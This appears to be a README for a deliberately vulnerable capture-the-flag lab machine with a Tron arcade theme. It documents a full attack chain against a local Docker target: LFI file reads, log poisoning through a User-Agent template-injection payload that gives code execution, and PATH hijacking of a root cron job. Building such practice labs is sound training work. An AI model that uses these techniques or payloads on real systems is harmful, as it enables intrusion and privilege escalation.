# Hill 12 - Flynn's Arcade (Tron) (repair -> LFI + log poisoning -> PATH hijack)

*Theme: Tron / Flynn's Arcade.* A "repair-first" hill: the cabinet boots into a rescue
shell (simulated grub) and the retro-CMS is offline until the boot record is fixed.

- **Repair gate:** `POST /rescue` with a boot record that reads `set boot=on` brings the
  cabinet online.
- **Entry:** `GET /view?page=...` is a **local file include**; every request's `User-Agent`
  is appended to `/var/log/arcade/access.log`, and `GET /render?page=...` evaluates template
  markers (`{{ ... }}`) in the file it reads. Poison the log with a marker in your
  `User-Agent`, then render the log -> **RCE**. Foothold: `kevin`. Port 80 (8092 locally).
- **Privesc:** a root cron runs `keeper` with the kevin-writable `/opt/arcade/bin` first on
  `PATH`. Drop your own `keeper` there; it runs as root within ~3s. Restored on reset.
- **Flags:** `user.txt` (foothold, readable via LFI) and `/root/root.txt` (root).

## Attack chain

    # 1. repair the boot record (bring the cabinet online)
    curl -s -X POST http://127.0.0.1:8092/rescue --data-urlencode 'cfg=set boot=on'

    # 2. LFI -> user flag
    curl -s -G http://127.0.0.1:8092/view --data-urlencode 'page=/home/kevin/user.txt'

    # 3. log poisoning -> RCE: drop a root-run keeper via a poisoned User-Agent, then render the log
    UA='{{(__import__("pathlib").Path("/opt/arcade/bin/keeper").write_text("#!/bin/sh\ncat /root/root.txt > /tmp/r; chmod 666 /tmp/r\n"), __import__("os").chmod("/opt/arcade/bin/keeper",0o755))}}'
    curl -s -A "$UA" -G http://127.0.0.1:8092/view --data-urlencode 'page=/etc/hostname' >/dev/null
    curl -s -G http://127.0.0.1:8092/render --data-urlencode 'page=/var/log/arcade/access.log' >/dev/null
    sleep 4
    curl -s -G http://127.0.0.1:8092/view --data-urlencode 'page=/tmp/r'   # root flag

## Run locally

    docker compose up -d --build   # app: http://localhost:8092/

## Reset behaviour

`reset.sh` re-arms the writable PATH dir and root cron, **re-breaks the boot** (back to rescue
mode), and keeps the server alive. It does **not** touch `king.txt`.

## Making the repair "real" on a VM

In the container the bootloader is simulated. On a real VM, ship a broken
`/boot/grub/grub.cfg` (or a bad `/etc/fstab`) so the machine drops into emergency mode, and
require the attacker to fix it from the console before the service comes up. See the wiki
("add your own hill") for wiring a VM-only repair step into `setup-hill.sh`.
